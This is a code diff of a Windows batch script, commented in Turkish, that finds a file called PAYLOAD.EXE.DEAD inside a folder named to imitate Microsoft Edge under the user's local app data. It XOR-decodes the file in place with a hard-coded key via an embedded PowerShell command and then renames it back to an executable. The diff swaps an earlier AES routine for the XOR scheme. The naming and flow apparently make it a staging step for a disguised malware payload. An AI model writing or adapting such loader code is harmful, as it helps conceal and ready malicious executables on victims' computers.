@@ -1,26 +1,32 @@
 @echo off
 setlocal EnableDelayedExpansion
 
+:: Başlangıç
 set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"
 
+:: Dosya var mı kontrolü
 if not exist "%filePath%" (
     echo File does not exist: %filePath%
     exit /b
 )
 
+:: Uzantı kontrolü
 if /i not "%filePath:~-5%"==".dead" (
     echo The file does not have a .dead extension: %filePath%
     exit /b
 )
 
+:: Dosya çözme işlemi
 echo Decrypting file %filePath%...
 call :EncryptDecryptFile "%filePath%"
 echo Decrypted: %filePath%
 
+:: Yeni dosya yolu oluşturma
 set "newFilePath=%filePath:.dead=%"
 echo Original file path: %filePath%
 echo New file path: %newFilePath%
 
+:: Dosya adını değiştirme
 for %%F in ("%filePath%") do (
     set "dir=%%~dpF"
     set "filename=%%~nF"
@@ -39,18 +45,14 @@ exit /b
 :EncryptDecryptFile
 set "inputFile=%~1"
 
+:: AES şifreleme çözme işlemi (PowerShell ile)
 powershell -NoProfile -Command ^
-    "$key = [System.Text.Encoding]::UTF8.GetBytes('strong_secret_key_here_256bits');" ^  # 256-bit key
-    "$key = $key[0..31]"  ^  # Ensure key is 256 bits (32 bytes)
-    "$iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456');"  ^  # 16 bytes for IV
+    "$key = 'now';" ^
     "$content = [System.IO.File]::ReadAllBytes(\"%inputFile%\");" ^
-    "$aesAlg = New-Object System.Security.Cryptography.AesManaged;" ^
-    "$aesAlg.Key = $key;" ^
-    "$aesAlg.IV = $iv;" ^
-    "$aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC;" ^
-    "$aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;" ^
-    "$transform = $aesAlg.CreateDecryptor();" ^
-    "$decrypted = $transform.TransformFinalBlock($content, 0, $content.Length);" ^
-    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $decrypted);"
+    "$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key);" ^
+    "for ($i = 0; $i -lt $content.Length; $i++) {" ^
+    "    $content[$i] = $content[$i] -bxor $keyBytes[$i %% $keyBytes.Length];" ^
+    "}" ^
+    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $content);"
 
 Exit /b
